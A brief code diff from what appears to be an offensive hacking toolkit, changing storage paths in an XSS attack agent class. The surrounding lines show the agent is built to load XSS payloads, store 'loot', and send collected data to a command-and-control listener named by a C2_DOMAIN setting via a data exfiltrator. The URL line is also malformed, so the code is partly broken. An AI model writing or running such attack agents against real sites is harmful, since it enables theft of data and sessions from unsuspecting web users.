@@ -30,11 +30,11 @@ class XSS_Agent(BaseAgent):
 
     def __init__(self, context_manager=None, orchestrator=None, **kwargs):
         super().__init__(context_manager, orchestrator, **kwargs)
-        self.results_dir = "/home/ubuntu/dlnk/workspace/loot/xss"
+        self.results_dir = "/mnt/c/projecattack/manus/workspace/loot/xss"
         self.payloads = self._load_payloads()
         self.listener_url = "http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/collect"  # Replace with actual listener
         os.makedirs(self.results_dir, exist_ok=True)
-        self.exfiltrator = DataExfiltrator(workspace_dir="/home/ubuntu/dlnk/workspace")
+        self.exfiltrator = DataExfiltrator(workspace_dir="/mnt/c/projecattack/manus/workspace")
 
     def _load_payloads(self) -> Dict[str, List[str]]:
         """โหลด XSS payloads แบ่งตามประเภท"""
